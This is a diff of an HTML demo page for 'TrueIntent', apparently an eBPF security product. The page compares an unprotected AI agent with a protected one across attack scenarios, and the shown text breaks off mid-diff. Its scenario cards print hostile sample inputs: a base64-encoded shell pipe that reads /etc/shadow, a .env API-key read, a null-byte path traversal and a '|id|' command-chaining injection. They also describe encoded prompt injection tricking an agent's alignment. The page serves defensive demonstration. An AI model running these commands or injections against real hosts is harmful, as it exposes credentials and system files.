@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en" class="dark">
+<html lang="en" class="dark scroll-smooth">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>TrueIntent // Before vs After Comparison</title>
+  <title>TrueIntent // Before vs After Attack Simulator</title>
 
   <!-- Tailwind CSS -->
   <script src="https://cdn.tailwindcss.com"></script>
@@ -13,8 +13,23 @@
       theme: {
         extend: {
           fontFamily: {
-            sans: ['Inter', '-apple-system', 'BlinkMacSystemFont', 'Segoe UI', 'Roboto', 'sans-serif'],
+            sans: ['Inter', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
             mono: ['JetBrains Mono', 'Menlo', 'monospace'],
+          },
+          colors: {
+            brand: {
+              950: '#060709',
+              900: '#0a0c10',
+              850: '#101318',
+              800: '#161a22',
+              700: '#212634',
+              emerald: '#10b981',
+              crimson: '#f43f5e',
+              amber: '#f59e0b',
+              blue: '#3b82f6',
+              purple: '#8b5cf6',
+              cyan: '#06b6d4'
+            }
           }
         }
       }
@@ -24,277 +39,453 @@
   <!-- Google Fonts & Lucide Icons & GSAP -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
   <script src="https://unpkg.com/lucide@latest"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
 
   <style>
     body {
-      background-color: #0b0f19;
-      color: #e2e8f0;
+      background-color: #060709;
+      color: #f3f4f6;
       font-family: 'Inter', sans-serif;
+      overflow-x: hidden;
     }
-    .card {
-      background: #111726;
+    .clean-box {
+      background: rgba(16, 19, 24, 0.75);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
       border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: 0.75rem;
+      border-radius: 1.25rem;
     }
-    .subcard {
-      background: #161e31;
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      border-radius: 0.5rem;
+    .glow-red {
+      box-shadow: 0 0 40px -10px rgba(244, 63, 94, 0.25);
+    }
+    .glow-green {
+      box-shadow: 0 0 40px -10px rgba(16, 185, 129, 0.25);
+    }
+    .glow-purple {
+      box-shadow: 0 0 35px -8px rgba(139, 92, 246, 0.3);
+    }
+    /* Flow pulse animation */
+    @keyframes pulsePacketRed {
+      0% { transform: scale(0.9); opacity: 0.6; }
+      50% { transform: scale(1.1); opacity: 1; filter: drop-shadow(0 0 10px #f43f5e); }
+      100% { transform: scale(0.9); opacity: 0.6; }
+    }
+    @keyframes pulsePacketGreen {
+      0% { transform: scale(0.9); opacity: 0.6; }
+      50% { transform: scale(1.1); opacity: 1; filter: drop-shadow(0 0 10px #10b981); }
+      100% { transform: scale(0.9); opacity: 0.6; }
+    }
+    .pulse-red {
+      animation: pulsePacketRed 2s infinite ease-in-out;
+    }
+    .pulse-green {
+      animation: pulsePacketGreen 2s infinite ease-in-out;
+    }
+    .grid-bg {
+      background-size: 32px 32px;
+      background-image: 
+        linear-gradient(to right, rgba(255, 255, 255, 0.03) 1px, transparent 1px),
+        linear-gradient(to bottom, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
     }
   </style>
 </head>
-<body class="min-h-screen text-slate-200 antialiased selection:bg-emerald-500/30 selection:text-white pb-20">
+<body class="min-h-screen grid-bg text-slate-100 antialiased selection:bg-brand-purple/30 selection:text-white pb-24">
 
   <!-- ===================================================================== -->
-  <!-- 1. STANDARD HEADER NAVBAR                                             -->
+  <!-- 1. NAVIGATION BAR                                                    -->
   <!-- ===================================================================== -->
-  <header class="border-b border-slate-800 bg-[#0d1321] sticky top-0 z-50">
-    <div class="max-w-6xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between">
-      
-      <!-- Logo -->
-      <a href="/" class="flex items-center space-x-2.5">
-        <div class="w-8 h-8 rounded-lg bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center">
-          <i data-lucide="shield-check" class="w-4 h-4 text-emerald-400"></i>
-        </div>
-        <div class="flex items-center space-x-2">
-          <span class="text-sm font-bold text-white tracking-tight">True<span class="text-emerald-400">Intent</span></span>
-          <span class="text-xs text-slate-500 font-normal">/</span>
-          <span class="text-xs text-slate-400 font-medium">Defense Comparison</span>
-        </div>
-      </a>
-
-      <!-- Right Link -->
+  <header class="fixed top-0 left-0 right-0 z-50 p-4 transition-all">
+    <div class="max-w-7xl mx-auto flex items-center justify-between px-5 py-3 rounded-2xl bg-brand-950/85 backdrop-blur-2xl border border-white/10 shadow-2xl">
       <div class="flex items-center space-x-3">
-        <a href="/" class="px-3 py-1.5 rounded-lg text-xs font-medium bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white border border-slate-700 transition-colors flex items-center space-x-1.5">
+        <a href="/" class="flex items-center space-x-2.5 text-white hover:text-brand-purple transition-all group">
+          <div class="w-8 h-8 rounded-xl bg-gradient-to-br from-brand-purple/30 to-brand-blue/20 border border-brand-purple/40 flex items-center justify-center shadow-lg group-hover:scale-105 transition-transform">
+            <i data-lucide="shield-split" class="w-4 h-4 text-brand-purple"></i>
+          </div>
+          <div>
+            <div class="text-sm font-black tracking-tight flex items-center space-x-1">
+              <span>True<span class="text-brand-emerald">Intent</span></span>
+              <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-brand-purple/20 text-brand-purple border border-brand-purple/30">VISUAL ARENA</span>
+            </div>
+            <div class="text-[10px] text-slate-400 font-mono -mt-0.5">Kernel eBPF vs Zero-Defense AI</div>
+          </div>
+        </a>
+      </div>
+
+      <div class="flex items-center space-x-3">
+        <div class="hidden sm:flex items-center space-x-2 px-3 py-1 rounded-xl bg-white/5 border border-white/10 text-slate-300 font-mono text-xs">
+          <span class="w-2 h-2 rounded-full bg-brand-emerald animate-ping"></span>
+          <span>Live Dual Simulator</span>
+        </div>
+        <a href="/" class="px-4 py-1.5 rounded-xl text-xs font-semibold bg-white/10 hover:bg-white/20 text-white border border-white/10 transition-all flex items-center space-x-1.5 shadow-sm">
           <i data-lucide="arrow-left" class="w-3.5 h-3.5"></i>
           <span>Back to Visualizer</span>
         </a>
       </div>
-
     </div>
   </header>
 
   <!-- ===================================================================== -->
-  <!-- 2. MAIN CONTENT                                                       -->
+  <!-- 2. HERO HEADLINE & VISUAL ATTACK VECTOR SELECTOR                     -->
   <!-- ===================================================================== -->
-  <main class="max-w-6xl mx-auto px-4 sm:px-6 pt-10 space-y-8">
+  <main class="pt-24 max-w-7xl mx-auto px-4 sm:px-6 space-y-7">
     
-    <!-- Title & Subtitle -->
-    <div class="space-y-2 text-center max-w-2xl mx-auto">
-      <h1 class="text-2xl sm:text-3xl font-bold text-white tracking-tight">
-        Before & After Defense Comparison
+    <!-- Title Section -->
+    <div class="text-center max-w-2xl mx-auto space-y-2">
+      <div class="inline-flex items-center space-x-2 px-3 py-1 rounded-full text-xs font-mono font-medium bg-brand-purple/15 border border-brand-purple/30 text-brand-purple shadow-sm">
+        <i data-lucide="eye" class="w-3.5 h-3.5"></i>
+        <span>Visual Impact Simulator</span>
+      </div>
+      <h1 class="text-3xl sm:text-5xl font-black text-white tracking-tight">
+        See The Difference in Action
       </h1>
-      <p class="text-sm text-slate-400 leading-relaxed">
-        Compare how an unprotected AI agent behaves against an evasive prompt versus an agent protected by TrueIntent's Linux kernel eBPF engine.
+      <p class="text-xs sm:text-sm text-slate-400">
+        Choose an evasive attack below and watch both architecture paths execute in real time.
       </p>
     </div>
 
-    <!-- Scenario Selection (Clean Segmented Tabs) -->
-    <div class="card p-5 space-y-4">
-      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-3">
-        <span class="text-xs font-semibold text-slate-300 uppercase tracking-wider flex items-center space-x-2">
-          <i data-lucide="crosshair" class="w-3.5 h-3.5 text-emerald-400"></i>
-          <span>Select Test Scenario</span>
+    <!-- 5 Visual Scenario Cards -->
+    <div class="clean-box p-4 sm:p-5 space-y-4">
+      <div class="flex items-center justify-between text-xs border-b border-white/10 pb-3">
+        <span class="flex items-center space-x-2 font-bold text-white uppercase tracking-wider text-[11px] font-mono">
+          <i data-lucide="crosshair" class="w-4 h-4 text-brand-purple"></i>
+          <span>1. Select Real-World Attack Scenario:</span>
         </span>
-        <span class="text-xs text-slate-500">Choose a payload to simulate both paths</span>
+        <span class="text-slate-400 font-mono text-[11px] hidden sm:inline">Click any scenario to load</span>
       </div>
 
-      <!-- Segmented Control Tabs -->
-      <div class="flex flex-wrap gap-2" id="scenario-tabs">
-        <button onclick="selectScenario('base64')" id="tab-base64" class="px-3.5 py-2 rounded-lg text-xs font-medium bg-emerald-500/10 text-emerald-300 border border-emerald-500/30 transition-colors cursor-pointer flex items-center space-x-1.5">
-          <i data-lucide="file-text" class="w-3.5 h-3.5"></i>
-          <span>Base64 Shell Command</span>
+      <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-3" id="scenario-selector-grid">
+        
+        <!-- Scenario 1: Base64 /etc/shadow -->
+        <button onclick="selectScenario('base64')" id="btn-card-base64" class="scen-card p-3.5 rounded-xl bg-brand-purple/15 border-2 border-brand-purple text-left transition-all cursor-pointer group hover:scale-[1.02] relative">
+          <div class="flex items-center justify-between mb-2">
+            <div class="w-8 h-8 rounded-lg bg-brand-purple/20 border border-brand-purple/40 flex items-center justify-center text-brand-purple">
+              <i data-lucide="file-key" class="w-4 h-4"></i>
+            </div>
+            <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-brand-crimson/20 text-brand-crimson font-bold border border-brand-crimson/30">HIGH</span>
+          </div>
+          <div class="text-xs font-bold text-white">Base64 Shell Pipe</div>
+          <div class="text-[11px] text-slate-400 font-mono mt-0.5">cat /etc/shadow</div>
+          <div class="absolute bottom-1 right-2 text-[10px] font-mono text-brand-purple font-bold opacity-0 group-hover:opacity-100 transition-opacity">SELECT ➔</div>
         </button>
-        <button onclick="selectScenario('env')" id="tab-env" class="px-3.5 py-2 rounded-lg text-xs font-medium bg-slate-800/60 text-slate-400 border border-slate-700/60 hover:text-white hover:bg-slate-800 transition-colors cursor-pointer flex items-center space-x-1.5">
-          <i data-lucide="key" class="w-3.5 h-3.5"></i>
-          <span>API Key File Exfiltration</span>
+
+        <!-- Scenario 2: Secret .env API Key -->
+        <button onclick="selectScenario('env')" id="btn-card-env" class="scen-card p-3.5 rounded-xl bg-white/5 border border-white/10 text-left transition-all cursor-pointer group hover:scale-[1.02] hover:border-white/20 relative">
+          <div class="flex items-center justify-between mb-2">
+            <div class="w-8 h-8 rounded-lg bg-white/10 border border-white/20 flex items-center justify-center text-amber-400">
+              <i data-lucide="key" class="w-4 h-4"></i>
+            </div>
+            <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-brand-crimson/20 text-brand-crimson font-bold border border-brand-crimson/30">CRITICAL</span>
+          </div>
+          <div class="text-xs font-bold text-white">API Key Exfil</div>
+          <div class="text-[11px] text-slate-400 font-mono mt-0.5">read_file env/.env</div>
         </button>
-        <button onclick="selectScenario('nullbyte')" id="tab-nullbyte" class="px-3.5 py-2 rounded-lg text-xs font-medium bg-slate-800/60 text-slate-400 border border-slate-700/60 hover:text-white hover:bg-slate-800 transition-colors cursor-pointer flex items-center space-x-1.5">
-          <i data-lucide="folder" class="w-3.5 h-3.5"></i>
-          <span>Null Byte Path Traversal</span>
+
+        <!-- Scenario 3: Null Byte %00 Traversal -->
+        <button onclick="selectScenario('nullbyte')" id="btn-card-nullbyte" class="scen-card p-3.5 rounded-xl bg-white/5 border border-white/10 text-left transition-all cursor-pointer group hover:scale-[1.02] hover:border-white/20 relative">
+          <div class="flex items-center justify-between mb-2">
+            <div class="w-8 h-8 rounded-lg bg-white/10 border border-white/20 flex items-center justify-center text-brand-cyan">
+              <i data-lucide="folder-lock" class="w-4 h-4"></i>
+            </div>
+            <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-brand-amber/20 text-brand-amber font-bold border border-brand-amber/30">EVASION</span>
+          </div>
+          <div class="text-xs font-bold text-white">Null Byte Traversal</div>
+          <div class="text-[11px] text-slate-400 font-mono mt-0.5">passwd%00.png</div>
         </button>
-        <button onclick="selectScenario('chaining')" id="tab-chaining" class="px-3.5 py-2 rounded-lg text-xs font-medium bg-slate-800/60 text-slate-400 border border-slate-700/60 hover:text-white hover:bg-slate-800 transition-colors cursor-pointer flex items-center space-x-1.5">
-          <i data-lucide="terminal" class="w-3.5 h-3.5"></i>
-          <span>Command Delimiter Chaining</span>
+
+        <!-- Scenario 4: Command Chaining Delimiters -->
+        <button onclick="selectScenario('chaining')" id="btn-card-chaining" class="scen-card p-3.5 rounded-xl bg-white/5 border border-white/10 text-left transition-all cursor-pointer group hover:scale-[1.02] hover:border-white/20 relative">
+          <div class="flex items-center justify-between mb-2">
+            <div class="w-8 h-8 rounded-lg bg-white/10 border border-white/20 flex items-center justify-center text-brand-blue">
+              <i data-lucide="terminal" class="w-4 h-4"></i>
+            </div>
+            <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-brand-crimson/20 text-brand-crimson font-bold border border-brand-crimson/30">EXEC</span>
+          </div>
+          <div class="text-xs font-bold text-white">Command Chaining</div>
+          <div class="text-[11px] text-slate-400 font-mono mt-0.5">/index.html|id|</div>
         </button>
-        <button onclick="selectScenario('reverse')" id="tab-reverse" class="px-3.5 py-2 rounded-lg text-xs font-medium bg-slate-800/60 text-slate-400 border border-slate-700/60 hover:text-white hover:bg-slate-800 transition-colors cursor-pointer flex items-center space-x-1.5">
-          <i data-lucide="radio" class="w-3.5 h-3.5"></i>
-          <span>Reverse TCP Shell</span>
+
+        <!-- Scenario 5: Reverse TCP Shell -->
+        <button onclick="selectScenario('reverse')" id="btn-card-reverse" class="scen-card p-3.5 rounded-xl bg-white/5 border border-white/10 text-left transition-all cursor-pointer group hover:scale-[1.02] hover:border-white/20 relative col-span-2 sm:col-span-1">
+          <div class="flex items-center justify-between mb-2">
+            <div class="w-8 h-8 rounded-lg bg-white/10 border border-white/20 flex items-center justify-center text-red-500">
+              <i data-lucide="radio" class="w-4 h-4"></i>
+            </div>
+            <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-brand-crimson/20 text-brand-crimson font-bold border border-brand-crimson/30">C2 CATASTROPHE</span>
+          </div>
+          <div class="text-xs font-bold text-white">Reverse TCP Shell</div>
+          <div class="text-[11px] text-slate-400 font-mono mt-0.5">socket connect()</div>
         </button>
+
       </div>
 
-      <!-- Active Payload Input & Clean Action Button -->
-      <div class="flex flex-col sm:flex-row items-stretch sm:items-center gap-3 pt-1">
-        <div class="flex-1 px-3.5 py-2.5 rounded-lg bg-[#0c101a] border border-slate-800 font-mono text-xs flex items-center space-x-2.5 overflow-hidden">
-          <span class="text-slate-500 text-xs font-medium">Payload:</span>
-          <span id="active-payload-display" class="text-slate-200 truncate font-mono">
+      <!-- Action Prompt Banner & Big Action Trigger Button -->
+      <div class="flex flex-col sm:flex-row items-stretch sm:items-center space-y-2 sm:space-y-0 sm:space-x-3 pt-1">
+        <div class="flex-1 px-3.5 py-2.5 rounded-xl bg-black/60 border border-white/10 font-mono text-xs flex items-center space-x-2.5 overflow-hidden">
+          <div class="flex items-center space-x-1.5 text-slate-500 flex-shrink-0">
+            <i data-lucide="code" class="w-4 h-4 text-brand-purple"></i>
+            <span class="font-bold text-[11px] text-slate-400 uppercase">Input Payload:</span>
+          </div>
+          <span id="active-payload-text" class="text-brand-purple font-semibold truncate">
             echo Y2F0IC9ldGMvc2hhZG93 | base64 -d | sh
           </span>
         </div>
 
-        <button onclick="runSimulation()" id="btn-run" class="px-5 py-2.5 rounded-lg text-xs font-semibold bg-emerald-600 hover:bg-emerald-500 text-white transition-colors cursor-pointer flex items-center justify-center space-x-2 flex-shrink-0 shadow-sm active:scale-[0.98]">
-          <i data-lucide="play" class="w-3.5 h-3.5 fill-current"></i>
-          <span>Simulate Attack</span>
+        <button onclick="triggerVisualSimulation()" id="btn-simulate" class="px-7 py-3 rounded-xl text-xs font-extrabold uppercase tracking-wider bg-gradient-to-r from-brand-purple to-brand-blue hover:opacity-95 text-white shadow-xl shadow-brand-purple/25 transition-all cursor-pointer flex items-center justify-center space-x-2 flex-shrink-0 active:scale-95">
+          <i data-lucide="play" class="w-4 h-4 fill-current"></i>
+          <span>Simulate Attack Now</span>
         </button>
       </div>
     </div>
 
     <!-- ===================================================================== -->
-    <!-- 3. SIDE-BY-SIDE COMPARISON CARDS                                      -->
+    <!-- 3. SIDE-BY-SIDE VISUAL ARCHITECTURAL ARENA                            -->
     <!-- ===================================================================== -->
-    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
 
-      <!-- ========================================== -->
-      <!-- CARD 1: WITHOUT TRUEINTENT (UNPROTECTED)   -->
-      <!-- ========================================== -->
-      <div class="card p-6 space-y-6 border-red-500/30 flex flex-col justify-between">
+      <!-- ============================================================ -->
+      <!-- LEFT: ❌ UNPROTECTED AGENT (ZERO DEFENSE)                     -->
+      <!-- ============================================================ -->
+      <div class="clean-box p-6 space-y-6 border-brand-crimson/40 bg-gradient-to-b from-brand-crimson/10 via-brand-950 to-brand-950 glow-red relative overflow-hidden flex flex-col justify-between">
         
-        <!-- Header -->
+        <!-- Header Status -->
         <div class="space-y-3">
-          <div class="flex items-center justify-between border-b border-slate-800 pb-3">
-            <span class="text-xs font-semibold text-slate-400 uppercase tracking-wider">Baseline Setup</span>
-            <span class="px-2.5 py-0.5 rounded-full text-xs font-medium bg-red-500/10 text-red-400 border border-red-500/20">
-              Vulnerable
+          <div class="flex items-center justify-between border-b border-brand-crimson/20 pb-3">
+            <div class="flex items-center space-x-2">
+              <span class="w-3 h-3 rounded-full bg-brand-crimson animate-ping"></span>
+              <span class="text-xs font-mono font-black text-brand-crimson uppercase tracking-wider">Unprotected System</span>
+            </div>
+            <span class="px-2.5 py-1 rounded-full text-[10px] font-mono font-bold bg-brand-crimson/20 text-brand-crimson border border-brand-crimson/40">
+              ZERO eBPF DEFENSE
             </span>
           </div>
 
           <div>
-            <h2 class="text-lg font-bold text-white">Without TrueIntent</h2>
-            <p class="text-xs text-slate-400 mt-1 leading-relaxed">
-              The AI agent accepts the user prompt. When evasion masks the intent, tool execution runs directly on the host operating system.
-            </p>
+            <h2 class="text-xl font-black text-white flex items-center space-x-2">
+              <span>Standard AI Agent Setup</span>
+            </h2>
+            <p class="text-xs text-slate-400 mt-0.5">Tool execution is directly dispatched to the host OS with zero kernel verification.</p>
           </div>
         </div>
 
-        <!-- Step-by-Step Flow List -->
-        <div class="space-y-3">
-          <div class="text-xs font-semibold text-slate-400 uppercase tracking-wider">Execution Steps</div>
-          
-          <div class="space-y-2.5">
-            <!-- Step 1 -->
-            <div id="unprot-step-1" class="subcard p-3 flex items-start space-x-3 transition-opacity">
-              <div class="w-6 h-6 rounded-md bg-slate-800 flex items-center justify-center text-xs font-bold text-slate-300 flex-shrink-0 mt-0.5">1</div>
-              <div>
-                <div class="text-xs font-semibold text-white">Prompt Ingested</div>
-                <div class="text-xs text-slate-400 mt-0.5" id="unprot-desc-1">LLM alignment safety filters are deceived by encoding.</div>
+        <!-- Visual Flow Diagram (The Visual Understanding) -->
+        <div class="space-y-2">
+          <div class="text-[11px] font-mono text-slate-400 font-bold uppercase tracking-wider flex items-center justify-between">
+            <span>Live Attack Trajectory</span>
+            <span id="badge-unprot-flow" class="text-brand-crimson font-bold">READY</span>
+          </div>
+
+          <!-- Interactive Node Pipeline -->
+          <div class="p-4 rounded-2xl bg-black/70 border border-brand-crimson/25 space-y-3">
+            
+            <!-- Step Node 1: Attacker -->
+            <div id="unprot-node-1" class="flex items-center space-x-3 p-2.5 rounded-xl bg-white/5 border border-white/5 transition-all">
+              <div class="w-9 h-9 rounded-xl bg-red-500/20 border border-red-500/40 flex items-center justify-center flex-shrink-0 text-red-400">
+                <i data-lucide="skull" class="w-4 h-4"></i>
+              </div>
+              <div class="flex-1 min-w-0">
+                <div class="flex items-center justify-between">
+                  <span class="text-xs font-bold text-white">1. Evasive Prompt Injected</span>
+                  <span class="text-[10px] font-mono text-brand-crimson font-bold">OBFUSCATED</span>
+                </div>
+                <div class="text-[11px] text-slate-400 font-mono truncate" id="unprot-text-1">Encoded payload sent to LLM</div>
               </div>
             </div>
 
-            <!-- Step 2 -->
-            <div id="unprot-step-2" class="subcard p-3 flex items-start space-x-3 transition-opacity">
-              <div class="w-6 h-6 rounded-md bg-amber-500/10 text-amber-400 flex items-center justify-center text-xs font-bold flex-shrink-0 mt-0.5">2</div>
-              <div>
-                <div class="text-xs font-semibold text-white">Unchecked Tool Call</div>
-                <div class="text-xs text-slate-400 mt-0.5">Agent dispatches system tool call straight to the host.</div>
+            <!-- Down Arrow -->
+            <div class="flex justify-center -my-1 text-red-500/50">
+              <i data-lucide="arrow-down" class="w-4 h-4 animate-bounce"></i>
+            </div>
+
+            <!-- Step Node 2: AI Agent (Bypassed) -->
+            <div id="unprot-node-2" class="flex items-center space-x-3 p-2.5 rounded-xl bg-white/5 border border-white/5 transition-all">
+              <div class="w-9 h-9 rounded-xl bg-yellow-500/20 border border-yellow-500/40 flex items-center justify-center flex-shrink-0 text-yellow-400">
+                <i data-lucide="bot" class="w-4 h-4"></i>
+              </div>
+              <div class="flex-1 min-w-0">
+                <div class="flex items-center justify-between">
+                  <span class="text-xs font-bold text-white">2. AI Agent Executes Tool</span>
+                  <span class="text-[10px] font-mono text-yellow-400 font-bold">BYPASSED</span>
+                </div>
+                <div class="text-[11px] text-slate-400 font-mono truncate">Model alignment tricked by disguise</div>
               </div>
             </div>
 
-            <!-- Step 3 -->
-            <div id="unprot-step-3" class="subcard p-3 flex items-start space-x-3 border-red-500/20 bg-red-950/20 transition-opacity">
-              <div class="w-6 h-6 rounded-md bg-red-500/20 text-red-400 flex items-center justify-center text-xs font-bold flex-shrink-0 mt-0.5">3</div>
-              <div>
-                <div class="text-xs font-semibold text-red-400">Host Compromise</div>
-                <div class="text-xs text-slate-300 mt-0.5" id="unprot-desc-3">Subprocess executes with host permissions and dumps sensitive data.</div>
+            <!-- Down Arrow -->
+            <div class="flex justify-center -my-1 text-red-500/50">
+              <i data-lucide="arrow-down" class="w-4 h-4 animate-bounce"></i>
+            </div>
+
+            <!-- Step Node 3: Linux Host Breach -->
+            <div id="unprot-node-3" class="flex items-center space-x-3 p-2.5 rounded-xl bg-brand-crimson/15 border border-brand-crimson/40 transition-all">
+              <div class="w-9 h-9 rounded-xl bg-brand-crimson/30 border border-brand-crimson/50 flex items-center justify-center flex-shrink-0 text-brand-crimson">
+                <i data-lucide="unlock" class="w-4 h-4"></i>
+              </div>
+              <div class="flex-1 min-w-0">
+                <div class="flex items-center justify-between">
+                  <span class="text-xs font-bold text-brand-crimson">3. Host OS Compromise</span>
+                  <span class="text-[10px] font-mono text-brand-crimson font-black">BREACHED</span>
+                </div>
+                <div class="text-[11px] text-slate-300 font-mono truncate" id="unprot-text-3">Root subprocess executed & data leaked</div>
               </div>
             </div>
+
           </div>
         </div>
 
-        <!-- Metric Badges -->
+        <!-- Large Visual Impact Scorecards -->
         <div class="grid grid-cols-2 gap-3 pt-2">
-          <div class="subcard p-3 text-center">
-            <div class="text-xs text-slate-400">Host Security</div>
-            <div id="metric-unprot-status" class="text-sm font-bold text-red-400 mt-1">100% Breached</div>
+          
+          <!-- Impact Metric 1 -->
+          <div class="p-4 rounded-xl bg-black/60 border border-brand-crimson/30 text-center space-y-1">
+            <div class="text-[10px] font-mono text-slate-400 uppercase font-semibold">Host Security Status</div>
+            <div id="metric-unprot-breach" class="text-xl font-black text-brand-crimson flex items-center justify-center space-x-1.5">
+              <i data-lucide="alert-triangle" class="w-5 h-5"></i>
+              <span>100% BREACH</span>
+            </div>
+            <div class="text-[10px] font-mono text-slate-500">Root permissions stolen</div>
           </div>
-          <div class="subcard p-3 text-center">
-            <div class="text-xs text-slate-400">Data Leaked</div>
-            <div id="metric-unprot-leak" class="text-sm font-bold text-red-400 mt-1">4,096 bytes</div>
+
+          <!-- Impact Metric 2 -->
+          <div class="p-4 rounded-xl bg-black/60 border border-brand-crimson/30 text-center space-y-1">
+            <div class="text-[10px] font-mono text-slate-400 uppercase font-semibold">Sensitive Data Leaked</div>
+            <div id="metric-unprot-leak" class="text-xl font-black text-brand-crimson flex items-center justify-center space-x-1.5">
+              <i data-lucide="radio" class="w-5 h-5"></i>
+              <span>4,096 BYTES</span>
+            </div>
+            <div class="text-[10px] font-mono text-slate-500">Exfiltrated to attacker</div>
           </div>
+
         </div>
 
-        <!-- Outcome Banner -->
-        <div class="p-3 rounded-lg bg-red-500/10 border border-red-500/20 text-center text-xs font-medium text-red-400 flex items-center justify-center space-x-2">
-          <i data-lucide="alert-circle" class="w-4 h-4"></i>
-          <span id="banner-unprotected">Critical: Unauthorized command executed on host</span>
+        <!-- Big Visual Result Stamp -->
+        <div id="stamp-unprotected" class="p-3.5 rounded-xl bg-brand-crimson/20 border-2 border-brand-crimson text-center font-mono font-black text-xs text-brand-crimson tracking-wider flex items-center justify-center space-x-2">
+          <i data-lucide="x-circle" class="w-4 h-4"></i>
+          <span id="stamp-unprotected-text">RESULT: UNCHECKED MALICIOUS EXECUTION</span>
         </div>
 
       </div>
 
-      <!-- ========================================== -->
-      <!-- CARD 2: WITH TRUEINTENT (PROTECTED)        -->
-      <!-- ========================================== -->
-      <div class="card p-6 space-y-6 border-emerald-500/30 flex flex-col justify-between">
+      <!-- ============================================================ -->
+      <!-- RIGHT: 🛡️ TRUEINTENT eBPF DEFENSE                             -->
+      <!-- ============================================================ -->
+      <div class="clean-box p-6 space-y-6 border-brand-emerald/40 bg-gradient-to-b from-brand-emerald/10 via-brand-950 to-brand-950 glow-green relative overflow-hidden flex flex-col justify-between">
         
-        <!-- Header -->
+        <!-- Header Status -->
         <div class="space-y-3">
-          <div class="flex items-center justify-between border-b border-slate-800 pb-3">
-            <span class="text-xs font-semibold text-slate-400 uppercase tracking-wider">Active Defense</span>
-            <span class="px-2.5 py-0.5 rounded-full text-xs font-medium bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
-              Protected
+          <div class="flex items-center justify-between border-b border-brand-emerald/20 pb-3">
+            <div class="flex items-center space-x-2">
+              <span class="w-3 h-3 rounded-full bg-brand-emerald animate-ping"></span>
+              <span class="text-xs font-mono font-black text-brand-emerald uppercase tracking-wider">Active Kernel Defense</span>
+            </div>
+            <span class="px-2.5 py-1 rounded-full text-[10px] font-mono font-bold bg-brand-emerald/20 text-brand-emerald border border-brand-emerald/40">
+              eBPF UPROBE PROTECTED
             </span>
           </div>
 
           <div>
-            <h2 class="text-lg font-bold text-white">With TrueIntent eBPF</h2>
-            <p class="text-xs text-slate-400 mt-1 leading-relaxed">
-              Linux kernel eBPF uprobe intercepts raw TLS buffers directly in memory before the OS executes any tool.
-            </p>
+            <h2 class="text-xl font-black text-white flex items-center space-x-2">
+              <span>TrueIntent eBPF Firewall</span>
+            </h2>
+            <p class="text-xs text-slate-400 mt-0.5">Inspects encrypted memory buffers via kernel uprobe and terminates dangerous packets.</p>
           </div>
         </div>
 
-        <!-- Step-by-Step Flow List -->
-        <div class="space-y-3">
-          <div class="text-xs font-semibold text-slate-400 uppercase tracking-wider">Inspection Steps</div>
-          
-          <div class="space-y-2.5">
-            <!-- Step 1 -->
-            <div id="prot-step-1" class="subcard p-3 flex items-start space-x-3 transition-opacity">
-              <div class="w-6 h-6 rounded-md bg-slate-800 flex items-center justify-center text-xs font-bold text-slate-300 flex-shrink-0 mt-0.5">1</div>
-              <div>
-                <div class="text-xs font-semibold text-white">eBPF Kernel Memory Hook</div>
-                <div class="text-xs text-slate-400 mt-0.5">Captures plaintext JSON-RPC at <span class="font-mono text-emerald-400">SSL_write</span> (<0.8ms).</div>
+        <!-- Visual Flow Diagram (The Visual Understanding) -->
+        <div class="space-y-2">
+          <div class="text-[11px] font-mono text-slate-400 font-bold uppercase tracking-wider flex items-center justify-between">
+            <span>Live Defense Trajectory</span>
+            <span id="badge-prot-flow" class="text-brand-emerald font-bold">ACTIVE</span>
+          </div>
+
+          <!-- Interactive Node Pipeline -->
+          <div class="p-4 rounded-2xl bg-black/70 border border-brand-emerald/25 space-y-3">
+            
+            <!-- Step Node 1: Intercepted in Memory -->
+            <div id="prot-node-1" class="flex items-center space-x-3 p-2.5 rounded-xl bg-white/5 border border-white/5 transition-all">
+              <div class="w-9 h-9 rounded-xl bg-brand-blue/20 border border-brand-blue/40 flex items-center justify-center flex-shrink-0 text-brand-blue">
+                <i data-lucide="cpu" class="w-4 h-4"></i>
+              </div>
+              <div class="flex-1 min-w-0">
+                <div class="flex items-center justify-between">
+                  <span class="text-xs font-bold text-white">1. eBPF Kernel Memory Tap</span>
+                  <span class="text-[10px] font-mono text-brand-blue font-bold">&lt;0.8ms ZERO-COPY</span>
+                </div>
+                <div class="text-[11px] text-slate-400 font-mono truncate">libssl.so:SSL_write tap captured buffer</div>
               </div>
             </div>
 
-            <!-- Step 2 -->
-            <div id="prot-step-2" class="subcard p-3 flex items-start space-x-3 transition-opacity">
-              <div class="w-6 h-6 rounded-md bg-blue-500/10 text-blue-400 flex items-center justify-center text-xs font-bold flex-shrink-0 mt-0.5">2</div>
-              <div>
-                <div class="text-xs font-semibold text-white">Deobfuscation & Policy Check</div>
